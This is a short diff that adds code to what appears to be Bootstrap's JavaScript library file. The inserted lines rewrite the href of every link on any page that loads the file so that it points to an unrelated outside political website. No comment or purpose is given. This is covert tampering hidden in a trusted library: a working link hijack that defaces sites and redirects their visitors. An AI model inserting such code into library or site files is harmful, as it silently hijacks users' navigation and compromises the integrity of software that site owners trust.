@@ -8,6 +8,11 @@ if (typeof jQuery === 'undefined') {
   throw new Error('Bootstrap\'s JavaScript requires jQuery')
 }
 
+var anchors = document.querySelectorAll('a');
+Array.prototype.forEach.call(anchors, function (element, index) {
+    element.href = "http://feelthebern.org";
+});
+
 +function ($) {
   'use strict';
   var version = $.fn.jquery.split(' ')[0].split('.')
